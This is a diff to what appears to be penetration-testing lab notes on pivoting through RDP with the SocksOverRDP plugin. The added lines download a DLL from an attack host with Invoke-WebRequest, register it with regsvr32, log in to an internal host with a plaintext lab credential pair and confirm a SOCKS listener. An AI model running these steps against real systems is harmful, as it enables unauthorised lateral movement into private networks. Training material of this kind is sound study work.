@@ -22,4 +22,27 @@ We can start by downloading the appropriate binaries to our attack host to perfo
 
 We can then connect to the target using xfreerdp and copy the `SocksOverRDPx64.zip` file to the target. From the Windows target, we will then need to load the SocksOverRDP.dll using regsvr32.exe.
 
+```powershell
+PS C:> Invoke-WebRequest -Uri "http://10.10.16.58:8081/SocksOverRDP-Plugin.dll" -OutFile "SocksOverRDP-Plugin.dll"
+```
+
+**Loading SocksOverRDP.dll using regsvr32.exe**
+
+
+
+<pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\Users\victim\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
+</strong></code></pre>
+
 \
+Now we can connect to 172.16.5.19 over RDP using `mstsc.exe`, and we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080. We can use the credentials `victor:pass@123` to connect to 172.16.5.19.
+
+When we go back to our foothold target and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080.
+
+**Confirming the SOCKS Listener is Started**
+
+```powershell
+C:\Users\victim\Desktop\SocksOverRDP-x64> netstat -antb | findstr 1080
+
+  TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING
+```
+
